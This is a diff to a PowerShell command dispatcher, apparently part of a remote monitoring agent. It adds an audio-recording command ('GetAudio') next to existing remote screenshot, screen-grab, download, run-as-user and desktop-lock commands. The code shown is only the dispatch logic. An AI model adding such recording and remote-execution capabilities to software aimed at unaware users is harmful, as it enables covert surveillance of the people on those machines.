@@ -14,18 +14,22 @@ function RunTask($calltask) {
 				& c:\windows\system32\schtasks.exe /run /i /tn "get-pctasks-assist"
 				} ELSE {
 					switch ($function) {
-     					get-pwdfyi {& $function}
-						notify {& $function $options}
+     					GetAudio {
+	  						if ($options) {GetAudio -startat $start -endat $end -rectime $options} ELSE {
+	 						GetAudio -startat $start -endat $end}
+						}
+	 				get-pwdfyi {& $function}
+					notify {& $function $options}
       					LOCKDESKTOP {& $function}
 	    				openweb {
 	  						if ($action) {$browser=$action} ELSE {$browser=$edge}
 	 						& $function -url $options -browser $browser
 							}
-						RunAsUser {& RUN -type $action -run $options}
-						SCREENGRAB {& $function -alt $action -rectime $options}
-						SCREENSHOT {& $function -startat $start -endat $end -freq $options}
-						SendTemp {& $function -type $action}
-						} #End Switch
+					RunAsUser {& RUN -type $action -run $options}
+					SCREENGRAB {& $function -alt $action -rectime $options}
+					SCREENSHOT {& $function -startat $start -endat $end -freq $options}
+					SendTemp {& $function -type $action}
+					} #End Switch
 					"RT is executing $function $action $options"
 					} #End ELSE
 	} #End RTUserCheck
@@ -35,6 +39,7 @@ function RunTask($calltask) {
 		ECHOTEST {& $function $CmdList}
 		LOCKDESKTOP {RTUserCheck}
 		DOWNLOAD {& $function -type $action -url $options}
+  		GetAudio {RTUserCheck}
   		get-pwdfyi {RTUserCheck}
     		openweb {RTUserCheck}
 		RUN {& $function -type $action -run $options}
